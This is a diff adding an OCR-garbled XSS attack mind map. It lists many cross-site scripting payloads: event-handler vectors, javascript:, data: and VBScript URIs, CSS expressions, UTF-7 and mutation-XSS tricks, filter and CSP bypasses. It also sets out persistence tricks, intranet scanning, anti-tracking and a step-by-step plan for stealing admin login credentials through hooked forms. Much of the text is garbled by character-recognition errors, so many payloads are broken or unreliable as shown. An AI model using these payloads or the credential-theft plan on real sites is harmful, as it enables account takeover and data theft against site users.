@@ -1,0 +1,810 @@
+dert‘ I ‘
+‘ﬂalerm II‘
+\u(000000000000006|)|e|1I1I
+seIIimeout(name)
+‘ {valueoleocation.lo5tring:
+qu°t ﬂ:pop.o:/iavascriplzaert
+X28I%29/source,length:l) (IE)
+
+eat backlash: Xbb"alert(l) (GBK prerequisil
+Script context charset)
+
+Break
+
+.. => \..
+
+ 
+
+after: mg src="'—></script><5vgl ir/gslgiggram v7ctor: dmg 5'ch
+
+445me “Md—“'5'“ W" onload=alerl I)//"><l—<script>
+
+I/[IO.I Smluﬁ-ﬁ),
+8233(utf-8ﬂderttl I”
+comment 70'9"“ 1"
+l'@cc,on-dert(l ))
+l/@cc,on-alert(l ))
+"aulofocus/onfocus=alert( I )ll
+quot "oncui=alerl(l )ll
+‘onclick=alerl( I )ll
+
+Break (IE)
+
+onclick="delFeedback('2&apos)
+dert(l III‘)"
+
+Named . ‘ .
+HTML gnu-ﬁes LIT/ﬁg: addUser( 235auot)dert(
+
+ininescﬁpt oncIick=‘addUser("23&#00000000
+
+0“ muralerrm/r'r'
+<a language=vbs
+
+ondick=‘addUser("l I \"&alert( I )\
+
+VBScript (IE <= 9)
+"')’>add<la>
+
+Adv: javascript:
+
+Whit I ‘
+javascriptacolon:alerl(l)
+
+Named anewLinejavascriplzdertu)
+)avascripl:aler1&1par:l&rpar1
+
+java&#0000000000ml)1 I5:cri
+0d ptzname
+
+javaxdhdmlmllnlﬂélmﬂ
+ptzname
+
+I h f dalaztext/
+I re b05864 html;base64.PHNjchwdD5hbGV
+
+yngxKvac2NanBOPg=
+
+dala:text/html.< sc ri pt
+>alerI(I )</sc r ip t>
+
+dala:),<script>alert(l )</script>
+
+URL encode javascript:alert%281%29
+
+JS URI
+HTML entities
+
+Hex
+
+ 
+    
+
+ 
+
+whilespace
+
+   
+     
+     
+
+DATA URI (Fiefox) Invdid mime-type
+
+dalaztext/
+hlml:cha'set=utf-8,<h I >abc
+
+dala&colon:%2t%2f;ba seM::/l.P
+HNjcmiw dD5hbG VydC
+ngvacZNanBOP = =
+
+vbscriptMsgbox+I
+
+ 
+
+Attribute charset
+
+VBScript URI (IE <= l0)
+
+<o
+style="behavior:|.l1(#default#Anc
+horCick):"
+folder=‘1avascript:dert(l )">cick<
+la> (IE <= 8)
+
+xsijt: <scriptlet> <impIements
+type="'behavior"/>
+qcript>aler1(l)<lscript> <l
+scriptlet>
+
+dnpul e=‘behavior:
+uII(xSs.txt "> (IE <= I0)
+
+l<a href=#>dine
+mlnHmschemaymicrosoft—
+, comzvml
+behawor style=behavior1urt(#default#vml);
+positionzabsolule
+href=javascripl:alerl( I)
+style IIEI strokecolor=while
+strokeweight=1000px irom=0
+to=l000 I><la> IIE <= 9)
+
+l<vmlframe xmlns=um2schemas
+microsofI—comzvml
+
+vml.xml: <xml> d'ect
+style="height:l00%;width:l00%"
+
+style=behaviorrurl(#default#vml);
+positio :absolule:width:
+100%.heightil (11%
+src=tesl:vml#xss></vmlframe> (IE
+
+id="'xss" onmouseover="alert(l )"
+strokecolor=‘\Nhite"
+strokeweight=“2000px'
+tiled=“false" /> <lxml>
+
+<=9)
+
+font-famﬁwaPIressiomalerm ))
+I\‘Iexp\'l
+
+font-famﬁwexpression (alert) (I)
+Origin expr\65ssion (alerl( I ))
+
+expression
+
+(tag)<img name="(lla )<img
+src=xx'x onerror=alert( I )III">
+
+  
+     
+   
+
+Fuzz vector
+(tagkl—(llagkimg src=xx:x
+onerror=alert(l ) _>
+
+<xmp><% <lxmp>dmg alt='%></
+Result xmp><img src=xx:x
+onerror=alert(l )//’> (IE <= 9)
+
+ﬁ§8ﬁ£ﬁ rt«(ii/$7,]0,l2,13,32A7lonload=ale
+
+<i""9
+ﬁﬁﬁpﬁﬁ $39, I 0, I 2.] 3,32)onerror="alerl
+
+<1X55="'><im src=xx.x'
+onerror=alert l)//">
+
+dt=“onload=dert(l)
+dt=' " name= onerror=alert()ll'
+href=[0x0b " oncick=alert(l )//
+
+<x ‘="‘foo'><x foo='>dmg src=x
+onerror=alert(l )//’> (IE 6-8)
+
+dnpul value="'<script>dert(l )<l
+scrip " ‘ l>
+
+<obiecl data=llpkavl
+teslswf><param name=movie
+Obiecl value=llpkavllestswf><paam
+name=allowscriplaccess
+value=aiways><lobiect>
+
+«vg><script/
+xink:href=data:,alerl(l )></script>
+«vg contenl5cripIType=textl
+vbs><script>MsgBox'I"d> (re <=
+IO)
+
+«vg><script>alerl&1par:
+lsrparl<lscript>
+
+«vgx/ y="'><x" onload=alerl(l )>
+
+I qvg><style>'(font—famﬁy:'<svg
+j onload=aler1(1)>';)</style></svg>
+
+<math )dirk:l'rref=javascript:.>
+
+<math><a
+Context xink:href=)avascripl::::>
+
+Math
+<math>qtyle>’(font-
+famiy:'dmg/src=xx:x
+onerror=alert(l )>')</style>
+
+Token ﬁﬁlﬁ
+
+319:8
+
+SVG
+
+ 
+
+I: Amemntd-leoﬁgin:'
+
+dink rel=import href=llevi>
+7. echo ‘<svg/onload=dert(l )>‘
+link
+dink rel=stylesheel href=dala:.'
+j %7b)cexpression(wrile(l ))
+Magic lag ‘ %7d> (IE)
+Adv: dlrame srcdoc="'&lt:iframe
+dlrame srcdoc='&lt;svg/ srcdoc='&am :II1iirame
+‘1 onload=alerl(l )sgl;’> onload=alertﬁ) &amp;gt:‘&glf'><
+r Iiframe>
+‘ Iframe
+dlrame
+src="data:),<script>alert(docume
+nI.doma'n)</script>'></
+ilrame> (Hrefox)
+
+<embed src=evil.swf
+dlowscriptaccess=aiways>
+
+5“de <embed code=evﬁswf
+dlowscriptaccess=aiways>
+‘ (Chrome)
+
+‘ base <base href="/\evrT'>
+Trigger <1—>qvg onload=alert(l)> —>
+
+<1 '=“foo"><x foo=’>dmg src=x
+onerror=alert(2)//’> (IE 6-9)
+
+<1[if<iframelonload=alerl( I )III>
+<1 [CDATA
+
+<1doctype
+
+r <% contenteditable
+onresize=alert(l)> (IEII, 9
+1 mode)
+
+7 <1 ‘="‘foo"><x foo=‘><img src=x
+onerror=alert(2)//’> (IE 6-9)
+
+. <mscri t>alertl<l00scrit>
+SpeCIdchar "£49,"? H I I p
+
+UTF-7: +ADw-script+AD4—
+dert(document.cookie)+ADw—/
+script+AD4— (IE)
+
+locationhref
+
+Specid charsel
+
+locationsearch IE don‘t URL encode <>
+
+location
+locationhash
+locationpathname
+windowhame
+
+document.cookie
+
+Found
+
+locd5lorage
+document.title
+geIAtIribuIe
+
+r documentreferrer
+
+I innerText
+
+.value
+
+dalasel
+
+Use backlash (\) bypass origin
+check code
+
+<b><noscript><a src=‘x' style=')c
+\3c\2fnoscript\3e\3ciframel
+
+I onload\3d alert(I)\3e‘> (IEI I,
+Input 0:0.2)
+
+postMessage
+
+ 
+
+disting>lsltimg src=l
+onerror=alert(l) Sgt<listing>
+
+dmg src="lest.jrg' alt
+="“onloadass )">
+
+<pkav xmlns=">dframe
+onload=alerl(l )'>123</pkav>
+
+s e="‘fonI-fam .‘ar\27\3bx
+Javascript {5’02“ .0" iY'
+\28\29\29\3bial'."'></I'>>
+
+dmg src=l style=“font—fam
+\220nerror\3d dert\28 l\29\20
+I ﬁy:'aaa‘."'>
+
+<% a=%&gt&ll;iframel
+onload=alerl(l )//>
+
+<img ="><script>alert(l )</
+script>">
+
+<div='l
+x=&qu0t&#39&gt:&lt:ilramel
+onload=alerl(l )Sgt:’>
+
+DOM <0 . _
+href="'&#x3000:javascrrpt:alert(l )"
+>cick<la>
+
+. location= )OVOSC&#I I4ipt&#55d
+'°°°"°" en&#4o~rs#4r' (IE)
+
+innerHT ML MXSS ,‘
+
+eval
+
+innerHT ML
+
+document.write
+‘ appendChﬁd
+1 ”9937 Function
+
+seIIimeout
+
+settnlervd
+with(documenl)body.appendCh
+ild(createHemenI(‘iframe
+onload=&#97&# I 08.“! I OI &# I I4
+
+am ran )>'II.bady:innerHTML
++=" IIEI
+
+createElement
+
+ottr
+
+data
+
+ojax
+Input
+
+.gel
+
+.val
+.I'Itml
+
+append
+.gel5cripl
+
+jQuery
+
+ojax daIaTypez‘scripI’
+”993' . content-typezlextljavaseript
+
+99' £get(‘data:/iavascr\ript,dert(l)‘)
+(ﬁrefox)
+
+1 SI
+IQuefYI
+ReacLis Trigger ReachreaIeEIement
+<b class=”ng—include:'l/evil"'>
+AngularJS dlrame ng-src=iavascript:.>
+Trigger angulaLeIement
+
+Ignore invdid URL encode:
+XAjavostscriptzalertU)
+
+SharedObiecI getLocal
+Input LocalConnection dlowDomain ('")
+
+<obiect id='p|€'),alert(l ).("av‘
+data=//target.swf ..
+
+loaderlnfaparameters
+
+HTML id attribute (IE)
+XSS H”:
+
+ 
+
+Security.dlowDomain ('")
+ag I : alert(l)
+Y'IIICOIChIeItdertII I)//
+
+L ?q=%ED%A0%80\"IIIOOIChIeI
+r Hash taken“ I)”
+Externallnterfacecal ag 2 7. var
+. qLString=IoaderInfo:paramelers(“
+59'“ b“9 q").spIit("\\"):ioin("\\\\"Ii
+
+3L
+Exte)rnallnterface:cal ("consolelo
+9".q :
+
+Trigger
+
+dmg src=eviswf>
+hImlTexI
+1 <a href=javascript::::>me<la>
+navigateToURL
+Loader
+oddCaIback
+style=xss:"/onclick=alerl(l )l/'
+
+<embed
+dlowscriptaccessd'alwalwaysays
+Puriﬁer " src=“test.swt’>
+
+Qc<script>ript>alert(l )</script>
+
+dt= oncick=alerl(l) dt=""ondick="alert( I )"
+Filer emojr
+Log'c length
+
+dmg src="xx# onerror=alerl(l )l/
+“059‘ lmmaaess)‘>
+
+style="xss:" onclick="alert(1 Ill"
+
+ 
+
+Applocation
+
+Server
+
+<a href=‘3<xx# oncick=alerl(l )//
+
+Database Text [Mkbj'x/rv
+
+data type
+V ARCHAR (353$? oncick=alerl(l )/l
+W Word 34*
+INF
+Mai IE2
+
+W
+W
+
+Swapload
+
+ZeroCIipboard
+
+JWPlayer
+
+Open ﬂash chart
+
+Hash tie
+
+Javascript ﬁle
+
+Image Exif
+dmg src=llevr1—DNS>
+<Iscripl/<ltextareal"'>dmg..
+Googe Search
+
+Feedback
+Input
+silezqqcom inurl:?id= J'dsuct'
+
+Browser Extend
+URL Paam Trafﬁc monitor VPN
+HTTP proxy
+Custom Spider
+xsssvg
+xssswf
+xss.xml
+xss:evt
+
+Upload
+xss.xxe
+
+dlrame src='jar:[1html§sectorg[
+test.'arl[testthtmr'xfrlrame>
+
+xsijt stat with: <script>
+Charles Mapping local J5 tie
+Fiddler Set cookies header
+
+xssjar (Fiefox)
+
+OS XIALT+ COMMAND + F
+Windows: CTRL + SHIFT+ F
+
+Chrome DevTooIs gobal code search
+
+Tool Fiebug—Lite
+IE EH
+VIEW-rd
+hIml5sec:orgﬂnnerhtmll
+
+shazzer.cotuk[
+
+dlrame src='javascripl:'<script
+SrC=//pkav><lscripl>'>
+
+<meta name=referrer
+
+Remove referer content=never>
+
+<a href=llta'gel reI=noreferer
+taget=pkav>cick<la>
+
+dlrame name=pkav>
+«vg/onload=eval(name)>
+d/oncick=URL=name>
+«cripI/src=/l14Rs
+
+J5 paytoad $(name)
+
+HTML payload
+after: </script>
+prerequisite: jQuery
+L<script>/'
+7. ‘lalerI(I )I’
+3x ‘l</script>
+id=<scriptl
+HPP aid=lsrc=lleviit
+aid=><lscript>
+
+dink rel=import href=l
+upload/....>
+
+Bypass len h limit
+gt Multiple input
+
+Parameters patchwork
+
+Chrome (Webkit) Upload ﬁle
+«cripl src=luploadl..><lscript>
+
+<a href=‘?xss=<script>dert(l )<l
+I script>">click</a>
+
+3W ”warm ﬁner PHP: «mat/9:009:00»,
+Wmlerm )</script>
+
+SMAE‘E-‘ﬁ:
+
+common acme
+DOM write HTML HEX encode
+
+prerequisite: %00 => \0
+
+Break IE Hash document location=javascriptf'«cript>alert
+protection (document)</script>"
+
+dsplay:block:position:absolute:to
+p:0:left:0:width11000px;height:
+IOOOpnbackgoundxed
+
+Non-equal: —<script/
+defer>alerl(l )<Iscript>
+
+InnerHTML exec JS
+dlramelsrc=aboul:blank
+FCC onload=alert(l)>
+
+Cross to other subdomain
+
+Break <4» area
+
+document.domain=‘ggtcom'
+
+dert(username);function
+usemame()() (IE)
+
+dink rel=import href=test.png>
+SWF FWS =‘BACONBACON‘-alert(l )II
+
+GIFS9a=
+
+Upload ﬁle header check bypass gang/ONMBOBOGUSBACONN
+
+GIF
+‘ GIFS90/'[al lzw datal'l
+\x3BjavascripLoaytoad
+
+<meta http—equiv="X—UA—
+Compatible" contentdIE=7" />
+
+Deﬁne variable in advance
+
+C5P bypass
+
+IE downgade vector Bypass IExss ﬁlter: <meta
+
+content=‘Whatever=EmulatelH"
+r http-equiv="'X—UA—Compatible">)
+
+<obiecl data="'[evil swﬂ"> | |
+gh reﬂect XSS convert 5Iore dlowScriptAccess =
+
+samedomain
+lison?a.html
+IE content-type sniff spoof Iisonl.html
+lison:.html
+I: window.name='exp‘
+
+windowhame
+7. location=‘/ltarget‘
+window name _. .
+. . . dlrame src— 'target‘
+Cross domarn tradrtional data name="exp">
+<a href="//Iarget" target="exp'>
+locationhash
+
+<form id='Window><input
+name=" name'>
+
+ 
+
+ccript>x=‘iavascript:dert(l )'<l
+script> (IE)
+
+ccript>xtoString()=='123‘</
+script>
+
+Hook variable via ID attribute
+
+ 
+
+<a href="l23" id Y'>test<l®
+
+Block Script tag via Webkil XSS 7abc=qcript>[page dala]<l
+auditor script>
+
+dlrame style=display:none src=ll
+Sump xss><rrframe>
+
+hisla'ymeplaceStaIe + rediect
+Infect old data
+WAS
+
+Worm
+
+Prevent expied: Set max-
+age=99999999
+
+Cookies Prevent overwritten: Set domain
+ﬁeld to lop—domain
+
+CRLF Inject set—cookie
+Hash Shaedobiecl setLocal
+
+Rootkit
+
+Localslorage settlem
+ServioeWotker + JSONp
+HTML5 Appcache
+
+I: No border iframe
+
+navigatorserviceWorkerreg'ster
+drtml manifest=‘/a:appcache’>
+Persistence X55
+
+Frame page hisla'ty:push5late
+
+7. Ada'ess bar sync
+locationhash
+
+Opener hijack opener:eval(...exp:::)
+
+<a Iarget=7blank>
+
+Open window event hook <form target=7blank>
+window:open
+
+HTTP response cache HPP
+
+Inject X55 code to al some orig'n
+X55—Proxy "“me
+I Local transfer HTTP proxy
+
+Jar v'rus
+
+CVEMI 3—225]
+
+CVEMI 4—0094
+
+CVEMI I-3923
+
+CVEMI 3—] 965
+
+CVEMI 3—] 966
+CVEMI 4—3 I Z)
+CVEMI 5—] 427
+
+Intranet border Patch bypass
+
+Struts 2' 30/8080
+X55—Intranet
+Ajax scan Intranet
+
+Basticsearch: 9200
+
+Trusting—zone
+Privieged—zone
+Local border IOS
+Inner-webview Andriod
+PC
+
+Detect tab is active:
+document.hidden
+
+Browser
+
+Local Fie bypass SOP
+
+BurpSuitebBOSO
+
+Charles:8080
+
+Fiddler:8888
+npm instal devtoolsdelect
+
+127.00.] :8080[histog{
+
+Str’l work Detect Local proxy
+
+Detect devtools
+response jQuery
+IP add to blacklist
+Anti-Tracking EXP
+
+Check referer
+
+Message
+X55 Proxy server
+Data receive
+“ Keep so-ron
+Clear console: console.clea
+
+Clear address bar:
+hisla'ymeplaceStaIe
+
+Use WebSocket replace Http
+Use Flash execute J5
+
+Clear trace
+
+Ajax get current page data
+VPN
+WebRTC gel Gateway info
+Intranet IP
+All link: documenIJinks
+1 Custom X—Forword-for bypass IP
+limit
+Replay cookies
+Use Http Proxy replay. prevent
+cookie doma'n ﬁeld wrong
+I: hook aI ink click event
+Info collection
+7. each path ﬁled remove cookie
+
+3L multiple cal history:push5late,
+prevent go back.
+
+4: ajax gel login page
+
+5 clear DOM: document:open
+6: write log'n page
+
+6: set document.title
+
+Steal Admin log'n info
+
+7: 500ms defer bind steal event
+to al form
+
